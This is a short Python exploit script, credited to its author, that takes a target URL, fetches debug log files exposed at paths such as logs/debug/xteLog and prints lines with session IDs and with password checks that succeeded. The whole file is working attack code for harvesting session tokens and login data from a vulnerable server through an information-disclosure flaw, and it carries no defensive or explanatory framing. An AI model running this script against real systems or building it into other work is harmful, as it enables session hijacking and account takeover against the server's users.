#!/bin/env python3
# by  Mohamed Shahat (shiky8)

import requests

# Function to fetch logs and search for matching lines
def fetch_and_search(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            lines = response.text.splitlines()
            matching_lines = []

            for i, line in enumerate(lines):
                if "sess_id" in line:
                    matching_lines.append(line)
                elif "user_check_password" in line and i + 2 < len(lines) and "OK" in lines[i + 2]:
                    matching_lines.append(line)

            return matching_lines
        else:
            print(f"Failed to retrieve data from {url}. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
    return []

# List of URLs to try
target =  str(input("Enter the tatget url ex:http://192.168.1.2:8080/: "))
urls = [
    f"{target}logs/debug/xteLog",
    f"{target}logs/debug/xteLog.0",
    f"{target}logs/debug/xteLog.1",
    f"{target}logs/debug/xteLog.2"
]

# Attempt to fetch and search from the URLs
matches = None
for url in urls:
    matches = fetch_and_search(url)
    if matches:
        print(f"Matches found in {url}.")
        break
else:
    print("No matches found in any of the URLs.")

# Print the results if any matches are found
if matches:
    print("\nMatching Lines:")
    for line in matches:
        print(line)

